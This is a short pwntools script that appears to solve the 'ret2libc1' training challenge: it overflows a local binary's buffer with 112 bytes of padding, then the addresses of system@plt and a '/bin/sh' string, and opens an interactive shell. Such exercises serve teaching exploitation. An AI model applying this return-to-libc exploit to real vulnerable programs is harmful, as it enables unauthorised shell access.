from pwn import *

sh = process('./ret2libc1')
binsh = 0x08048720
system_plt = 0x08048460

payload = flat(['a' * 112, system_plt, 'b' * 4, binsh])
sh.sendline(payload)

sh.interactive()
